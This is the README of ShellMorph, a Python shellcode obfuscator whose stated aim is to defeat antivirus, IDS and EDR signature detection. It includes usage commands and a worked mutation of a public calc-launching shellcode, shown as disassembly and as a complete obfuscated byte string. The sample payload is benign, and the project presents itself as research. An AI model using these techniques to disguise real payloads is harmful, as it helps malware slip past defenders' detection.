# ShellMorph

## Overview
ShellMorph is a Python 3 project designed to manipulate and obfuscate shellcode for various use cases. 

I wrote this shellcode obfuscator as part of my research on shellcode loaders capable of evading EDR and to deepen my understanding of low-level shellcode execution and manipulation.
Please note that this is not a shellcode loader but rather a shellcode morphological obfuscator. 

The primary purpose of this shellcode obfuscator is to bypass static and runtime signature-based detections implemented by IDS or AV products, whether on disk or in memory. Take Metasploit as an example—its shellcode payloads have been public for years, and most major IDS/AV solutions can now detect them using extensive malware signature databases.

Manually modifying shellcode or writing new ones from scratch to evade detection is a never-ending and inefficient task. You might think that using the Shikata Ga Nai encoder or encrypting the shellcode could effectively bypass signature detection, but these approaches have two major drawbacks:

1. They only evade scanners while the shellcode remains encrypted (in a non-executable state, which is essentially useless). However, once executed, the shellcode decrypts and becomes vulnerable to runtime memory scanning.

2. They require RWX memory permissions to decrypt and execute the shellcode at runtime—an inherently suspicious and easily detectable behavior.

My goal is to develop a tool that takes any binary shellcode and modifies its instructions in a way that preserves its functionality while making the code unique and harder to analyze, thereby bypassing signature-based detection. This means the obfuscated shellcode can be embedded in a file in its clear form or reside in memory without being flagged by memory scanners.

By doing this, we generate a randomized, functionally equivalent shellcode that doesn't rely on encryption or encoding, eliminating the need for RWX memory permissions. Additionally, since the obfuscated shellcode differs at the byte level from the original, it becomes much harder to detect through signature-based scanning.

This tool is particularly useful in scenarios where shellcode needs to be saved on disk (e.g., embedded inside an executable) or where execution from RWX memory must be avoided (making encryption and encoding infeasible). However, obfuscation significantly increases the shellcode's size, which may not be desirable for exploit payloads where minimizing shellcode size is a priority. Additionally, this method does not guarantee the avoidance of bad bytes (not suitable for buffer overflow exploits).

It's important to note that this article does not cover techniques for evading behavioral analysis or code emulation employed by various security products. Again, this is not a shellcode loader—this is a shellcode morphological byte modifier.

This tool is based on the following approach: disassemble the input shellcode, analyze, and modify it with advanced techniques, including instruction substitution, junk insertion, block reordering, and more.

**Warning:** ShellMorph only works with purely executable shellcode (e.g., Meterpreter or other beacons) and not with shellcode containing data sections (e.g., shellcode produced by Donut). Since ShellMorph is currently unable to bypass data sections, it ends up corrupting the shellcode.
Additionally, note that ShellMorph is not designed to work with shellcodes that are already obfuscated or encrypted (those methods can cause runtime byte changes, leading to conflicts). It is intended to be used only with clear inputs.


---

## Features

- **Disassembly and Analysis**: Uses the Capstone engine to disassemble shellcode and extract instruction-level details.
- **Instruction Substitution**: Replaces certain instructions with multi-step equivalent sequences.
- **Junk Insertion**: Adds random junk instructions to obfuscate code.
- **Block Obfuscation**: Reorders code blocks and modifies control flow.
- **Reassembly**: Reassembles the modified shellcode using Keystone.
- **Supports x86 and x64 Architectures**.

---

## Dependencies

The project relies on the following Python libraries:

- `argparse`: For parsing command-line arguments.
- `capstone`: For disassembling shellcode.
- `keystone`: For assembling instructions.
- `colorama`: For colorful console output.

Install dependencies via pip:

```bash
pip install capstone keystone colorama
```

---

## Usage

### Command-Line Arguments

| Argument                | Description                                                  |
|-------------------------|--------------------------------------------------------------|
| `--shellcode`           | Input shellcode as a bytes object.                          |
| `--input-file`          | Path to a binary file containing raw shellcode.             |
| `--output`              | Path to save the modified shellcode.                       |
| `--arch`                | Target architecture: `x86` or `x64`.                       |
| `--junk-frequency`      | Frequency of junk insertion (default: `0.4`).               |
| `--max-junk-seq`        | Maximum sequence of junk instructions (default: `3`).       |
| `--sse-junk`            | Enable SSE junk instructions.                               |
| `--reorder-strategy`    | Block reorder strategy (default: `advanced-cfg`).           |
| `--block-alignment`     | Block alignment in bytes (default: `0x00`).                 |

---

### Examples

#### x64 Shellcode
```bash
python main.py \
  --shellcode b'\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18' \
  --arch x64
```

#### x86 Shellcode from File
```bash
python main.py \
  --input-file "C:\Users\example\Desktop\input.bin" \
  --arch x86 \
  --output "C:\Users\example\Desktop\output.bin"
```

---
### Mutation Example

**Command:**
```bash
python3 main.py --arch x64 --shellcode b'\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6'
```

Shellcode used: Link => [Windows/x64 - Dynamic Null-Free WinExec PopCalc Shellcode (205 Bytes)](https://www.exploit-db.com/shellcodes/49819)

**Input:**
```bash
Block#0 [0x0000000000001000-0x0000000000001057] (26 instrs)
   0x0000000000001000: xor      rdi, rdi [NONE]
   0x0000000000001003: mul      rdi [NONE]
   0x0000000000001006: mov      rbx, qword ptr gs:[rax + 0x60] [NONE]
   0x000000000000100B: mov      rbx, qword ptr [rbx + 0x18] [NONE]
   0x000000000000100F: mov      rbx, qword ptr [rbx + 0x20] [NONE]
   0x0000000000001013: mov      rbx, qword ptr [rbx] [NONE]
   0x0000000000001016: mov      rbx, qword ptr [rbx] [NONE]
   0x0000000000001019: mov      rbx, qword ptr [rbx + 0x20] [NONE]
   0x000000000000101D: mov      r8, rbx [NONE]
   0x0000000000001020: mov      ebx, dword ptr [rbx + 0x3c] [NONE]
   0x0000000000001023: add      rbx, r8 [NONE]
   0x0000000000001026: xor      rcx, rcx [NONE]
   0x0000000000001029: add      cx, 0x88ff [NONE]
   0x000000000000102E: shr      rcx, 8 [NONE]
   0x0000000000001032: mov      edx, dword ptr [rbx + rcx] [NONE]
   0x0000000000001035: add      rdx, r8 [NONE]
   0x0000000000001038: xor      r10, r10 [NONE]
   0x000000000000103B: mov      r10d, dword ptr [rdx + 0x1c] [NONE]
   0x000000000000103F: add      r10, r8 [NONE]
   0x0000000000001042: xor      r11, r11 [NONE]
   0x0000000000001045: mov      r11d, dword ptr [rdx + 0x20] [NONE]
   0x0000000000001049: add      r11, r8 [NONE]
   0x000000000000104C: xor      r12, r12 [NONE]
   0x000000000000104F: mov      r12d, dword ptr [rdx + 0x24] [NONE]
   0x0000000000001053: add      r12, r8 [NONE]
   0x0000000000001056: jmp      0x108a [JMP|REL|SHORT] => 0x000000000000108A

Block#1 [0x0000000000001058-0x0000000000001060] (5 instrs)
   0x0000000000001058: pop      rbx [NONE]
   0x0000000000001059: pop      rcx [NONE]
   0x000000000000105A: xor      rax, rax [NONE]
   0x000000000000105D: mov      rdx, rsp [NONE]
   0x0000000000001060: push     rcx [NONE]

Block#2 [0x0000000000001061-0x000000000000107A] (9 instrs)
   0x0000000000001061: mov      rcx, qword ptr [rsp] [NONE]
   0x0000000000001065: xor      rdi, rdi [NONE]
   0x0000000000001068: mov      edi, dword ptr [r11 + rax*4] [NONE]
   0x000000000000106C: add      rdi, r8 [NONE]
   0x000000000000106F: mov      rsi, rdx [NONE]
   0x0000000000001072: repe cmpsb byte ptr [rsi], byte ptr [rdi] [NONE]
   0x0000000000001074: je       0x107b [JMP|COND|REL|SHORT] => 0x000000000000107B
   0x0000000000001076: inc      rax [NONE]
   0x0000000000001079: jmp      0x1061 [JMP|REL|SHORT] => 0x0000000000001061

Block#3 [0x000000000000107B-0x0000000000001089] (6 instrs)
   0x000000000000107B: pop      rcx [NONE]
   0x000000000000107C: mov      ax, word ptr [r12 + rax*2] [NONE]
   0x0000000000001081: mov      eax, dword ptr [r10 + rax*4] [NONE]
   0x0000000000001085: add      rax, r8 [NONE]
   0x0000000000001088: push     rbx [NONE]
   0x0000000000001089: ret       [RET]

Block#4 [0x000000000000108A-0x00000000000010CC] (19 instrs)
   0x000000000000108A: xor      rcx, rcx [NONE]
   0x000000000000108D: add      cl, 7 [NONE]
   0x0000000000001090: movabs   rax, 0x9c9a87ba9196a80f [NONE]
   0x000000000000109A: not      rax [NONE]
   0x000000000000109D: shr      rax, 8 [NONE]
   0x00000000000010A1: push     rax [NONE]
   0x00000000000010A2: push     rcx [NONE]
   0x00000000000010A3: call     0x1058 [CALL|REL] => 0x0000000000001058
   0x00000000000010A8: mov      r14, rax [NONE]
   0x00000000000010AB: xor      rcx, rcx [NONE]
   0x00000000000010AE: mul      rcx [NONE]
   0x00000000000010B1: push     rax [NONE]
   0x00000000000010B2: movabs   rax, 0x9a879ad19c939e9c [NONE]
   0x00000000000010BC: not      rax [NONE]
   0x00000000000010BF: push     rax [NONE]
   0x00000000000010C0: mov      rcx, rsp [NONE]
   0x00000000000010C3: inc      rdx [NONE]
   0x00000000000010C6: sub      rsp, 0x20 [NONE]
   0x00000000000010CA: call     r14 [CALL]
```

**Output:**

```bash
Block#0 [0x0000000000002000-0x00000000000020A0] (57 instrs)
   0x0000000000002000: sub      rdi, rdi [NONE]
   0x0000000000002003: mul      rdi [NONE]
   0x0000000000002006: mov      rbx, qword ptr gs:[rax + 0x60] [NONE]
   0x000000000000200B: mov      rbx, qword ptr [rbx + 0x18] [NONE]
   0x000000000000200F: nop       [NONE]
   0x0000000000002010: mov      rbx, qword ptr [rbx + 0x20] [NONE]
   0x0000000000002014: nop       [NONE]
   0x0000000000002015: mov      rdx, rdx [NONE]
   0x0000000000002018: mov      rbx, qword ptr [rbx] [NONE]
   0x000000000000201B: mov      rbx, qword ptr [rbx] [NONE]
   0x000000000000201E: mov      rbx, qword ptr [rbx + 0x20] [NONE]
   0x0000000000002022: mov      r11, r11 [NONE]
   0x0000000000002025: mov      rsi, rsi [NONE]
   0x0000000000002028: xchg     r11, r11 [NONE]
   0x000000000000202B: mov      r8, rbx [NONE]
   0x000000000000202E: mov      r9, r9 [NONE]
   0x0000000000002031: mov      ebx, dword ptr [rbx + 0x3c] [NONE]
   0x0000000000002034: add      rbx, r8 [NONE]
   0x0000000000002037: xchg     rdi, rdi [NONE]
   0x000000000000203A: mov      r8, r8 [NONE]
   0x000000000000203D: sub      rcx, rcx [NONE]
   0x0000000000002040: add      cx, 0x88ff [NONE]
   0x0000000000002045: mov      rax, rax [NONE]
   0x0000000000002048: xchg     r10, r10 [NONE]
   0x000000000000204B: shr      rcx, 8 [NONE]
   0x000000000000204F: nop       [NONE]
   0x0000000000002050: mov      rax, rax [NONE]
   0x0000000000002053: xchg     rsi, rsi [NONE]
   0x0000000000002056: mov      edx, dword ptr [rbx + rcx] [NONE]
   0x0000000000002059: xchg     r8, r8 [NONE]
   0x000000000000205C: xchg     rcx, rcx [NONE]
   0x000000000000205F: add      rdx, r8 [NONE]
   0x0000000000002062: mov      r9, r9 [NONE]
   0x0000000000002065: sub      r10, r10 [NONE]
   0x0000000000002068: xchg     rdx, rdx [NONE]
   0x000000000000206B: mov      r10d, dword ptr [rdx + 0x1c] [NONE]
   0x000000000000206F: xchg     r11, r11 [NONE]
   0x0000000000002072: mov      rdi, rdi [NONE]
   0x0000000000002075: xchg     r9, r9 [NONE]
   0x0000000000002078: add      r10, r8 [NONE]
   0x000000000000207B: nop       [NONE]
   0x000000000000207C: mov      r9, r9 [NONE]
   0x000000000000207F: xchg     r10, r10 [NONE]
   0x0000000000002082: sub      r11, r11 [NONE]
   0x0000000000002085: mov      r11d, dword ptr [rdx + 0x20] [NONE]
   0x0000000000002089: add      r11, r8 [NONE]
   0x000000000000208C: nop       [NONE]
   0x000000000000208D: nop       [NONE]
   0x000000000000208E: nop       [NONE]
   0x000000000000208F: sub      r12, r12 [NONE]
   0x0000000000002092: mov      rcx, rcx [NONE]
   0x0000000000002095: mov      r12d, dword ptr [rdx + 0x24] [NONE]
   0x0000000000002099: nop       [NONE]
   0x000000000000209A: nop       [NONE]
   0x000000000000209B: nop       [NONE]
   0x000000000000209C: add      r12, r8 [NONE]
   0x000000000000209F: jmp      0x108a [JMP|REL|SHORT] => 0x00000000000020A1

Block#4 [0x00000000000020A1-0x0000000000002119] (37 instrs)
   0x00000000000020A1: sub      rcx, rcx [NONE]
   0x00000000000020A4: add      cl, 7 [NONE]
   0x00000000000020A7: pushf     [NONE]
   0x00000000000020A9: push     rcx [NONE]
   0x00000000000020AA: movabs   rax, 0x9C9A87BA00000000 [NONE]
   0x00000000000020B4: movabs   rcx, 0x9196A80F [NONE]
   0x00000000000020BE: or       rax, rcx [NONE]
   0x00000000000020C1: pop      rcx [NONE]
   0x00000000000020C2: popf      [NONE]
   0x00000000000020C4: not      rax [NONE]
   0x00000000000020C7: shr      rax, 8 [NONE]
   0x00000000000020CB: push     rax [NONE]
   0x00000000000020CC: push     rcx [NONE]
   0x00000000000020CD: xchg     r11, r11 [NONE]
   0x00000000000020D0: mov      r11, r11 [NONE]
   0x00000000000020D3: call     0x1058 [CALL|REL] => 0x000000000000212A
   0x00000000000020D8: mov      r14, rax [NONE]
   0x00000000000020DB: sub      rcx, rcx [NONE]
   0x00000000000020DE: mul      rcx [NONE]
   0x00000000000020E1: push     rax [NONE]
   0x00000000000020E2: pushf     [NONE]
   0x00000000000020E4: push     rcx [NONE]
   0x00000000000020E5: movabs   rax, 0x9A879AD100000000 [NONE]
   0x00000000000020EF: movabs   rcx, 0x9C939E9C [NONE]
   0x00000000000020F9: or       rax, rcx [NONE]
   0x00000000000020FC: pop      rcx [NONE]
   0x00000000000020FD: popf      [NONE]
   0x00000000000020FF: not      rax [NONE]
   0x0000000000002102: push     rax [NONE]
   0x0000000000002103: mov      rcx, rcx [NONE]
   0x0000000000002106: mov      rcx, rsp [NONE]
   0x0000000000002109: mov      r8, r8 [NONE]
   0x000000000000210C: nop       [NONE]
   0x000000000000210D: xchg     rsi, rsi [NONE]
   0x0000000000002110: inc      rdx [NONE]
   0x0000000000002113: sub      rsp, 0x20 [NONE]
   0x0000000000002117: call     r14 [CALL]

Block#3 [0x000000000000211A-0x0000000000002129] (7 instrs)
   0x000000000000211A: pop      rcx [NONE]
   0x000000000000211B: mov      ax, word ptr [r12 + rax*2] [NONE]
   0x0000000000002120: mov      eax, dword ptr [r10 + rax*4] [NONE]
   0x0000000000002124: add      rax, r8 [NONE]
   0x0000000000002127: push     rbx [NONE]
   0x0000000000002128: nop       [NONE]
   0x0000000000002129: ret       [RET]

Block#1 [0x000000000000212A-0x0000000000002143] (12 instrs)
   0x000000000000212A: pop      rbx [NONE]
   0x000000000000212B: pop      rcx [NONE]
   0x000000000000212C: xchg     rsi, rsi [NONE]
   0x000000000000212F: mov      rcx, rcx [NONE]
   0x0000000000002132: sub      rax, rax [NONE]
   0x0000000000002135: mov      rbx, rbx [NONE]
   0x0000000000002138: xchg     rcx, rcx [NONE]
   0x000000000000213B: nop       [NONE]
   0x000000000000213C: mov      rdx, rsp [NONE]
   0x000000000000213F: mov      r9, r9 [NONE]
   0x0000000000002142: push     rcx [NONE]
   0x0000000000002143: nop       [NONE]

Block#2 [0x0000000000002144-0x000000000000216B] (15 instrs)
   0x0000000000002144: mov      rcx, qword ptr [rsp] [NONE]
   0x0000000000002148: nop       [NONE]
   0x0000000000002149: nop       [NONE]
   0x000000000000214A: xchg     rax, rax [NONE]
   0x000000000000214D: sub      rdi, rdi [NONE]
   0x0000000000002150: mov      edi, dword ptr [r11 + rax*4] [NONE]
   0x0000000000002154: add      rdi, r8 [NONE]
   0x0000000000002157: mov      rsi, rdx [NONE]
   0x000000000000215A: repe cmpsb byte ptr [rsi], byte ptr [rdi] [NONE]
   0x000000000000215C: je       0x107b [JMP|COND|REL|SHORT] => 0x000000000000211A
   0x000000000000215E: inc      rax [NONE]
   0x0000000000002161: mov      r8, r8 [NONE]
   0x0000000000002164: mov      rdx, rdx [NONE]
   0x0000000000002167: xchg     rsi, rsi [NONE]
   0x000000000000216A: jmp      0x1061 [JMP|REL|SHORT] => 0x0000000000002144
```

**C-style shellcode output obtained:**
```bash
"\x48\x29\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x90\x48\x8b\x5b\x20\x90\x48\x89\xd2\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x4d\x89\xdb\x48\x89\xf6\x4d\x87\xdb\x49\x89\xd8\x4d\x89\xc9\x8b\x5b\x3c\x4c\x01\xc3\x48\x87\xff\x4d\x89\xc0\x48\x29\xc9\x66\x81\xc1\xff\x88\x48\x89\xc0\x4d\x87\xd2\x48\xc1\xe9\x08\x90\x48\x89\xc0\x48\x87\xf6\x8b\x14\x0b\x4d\x87\xc0\x48\x87\xc9\x4c\x01\xc2\x4d\x89\xc9\x4d\x29\xd2\x48\x87\xd2\x44\x8b\x52\x1c\x4d\x87\xdb\x48\x89\xff\x4d\x87\xc9\x4d\x01\xc2\x90\x4d\x89\xc9\x4d\x87\xd2\x4d\x29\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x90\x90\x90\x4d\x29\xe4\x48\x89\xc9\x44\x8b\x62\x24\x90\x90\x90\x4d\x01\xc4\xeb\x00\x48\x29\xc9\x80\xc1\x07\x66\x9c\x51\x48\xb8\x00\x00\x00\x00\xba\x87\x9a\x9c\x48\xb9\x0f\xa8\x96\x91\x00\x00\x00\x00\x48\x09\xc8\x59\x66\x9d\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\x4d\x87\xdb\x4d\x89\xdb\xe8\x52\x00\x00\x00\x49\x89\xc6\x48\x29\xc9\x48\xf7\xe1\x50\x66\x9c\x51\x48\xb8\x00\x00\x00\x00\xd1\x9a\x87\x9a\x48\xb9\x9c\x9e\x93\x9c\x00\x00\x00\x00\x48\x09\xc8\x59\x66\x9d\x48\xf7\xd0\x50\x48\x89\xc9\x48\x89\xe1\x4d\x89\xc0\x90\x48\x87\xf6\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\x90\xc3\x5b\x59\x48\x87\xf6\x48\x89\xc9\x48\x29\xc0\x48\x89\xdb\x48\x87\xc9\x90\x48\x89\xe2\x4d\x89\xc9\x51\x90\x48\x8b\x0c\x24\x90\x90\x48\x90\x90\x48\x29\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\xbc\x48\xff\xc0\x4d\x89\xc0\x48\x89\xd2\x48\x87\xf6\xeb\xd8"
```

---
## TODOs

1. Test with more shellcode samples.
2. Implement a robust Data Flow Analyzer.
3. Expand instruction substitutions with additional safe options. The more substitution, the more obfuscated.
4. Add support for code flattening.

---

## Contributing

Contributions are welcome! If you encounter any issues or have feature requests, feel free to open an issue or submit a pull request.

---

## License

This project is licensed under the MIT License. See the LICENSE file for details.

---

## Disclaimer

The authors of this repository are not responsible for any misuse of the information. You shall not misuse the information to gain unauthorized access and/or write malicious programs. This information shall only be used to expand knowledge and not for causing malicious or damaging attacks. You may try all of these techniques on your own computer at your own risk. Performing any hack attempts/tests without written permission from the owner of the computer system is illegal.

In no event shall the contributors, creators, owners of this repository be liable for any direct, indirect, incidental, special, exemplary, consequential damages (including but not limited to procurement of damage in services, loss of use, data, profit, business interruption) however caused and any theory of liability.
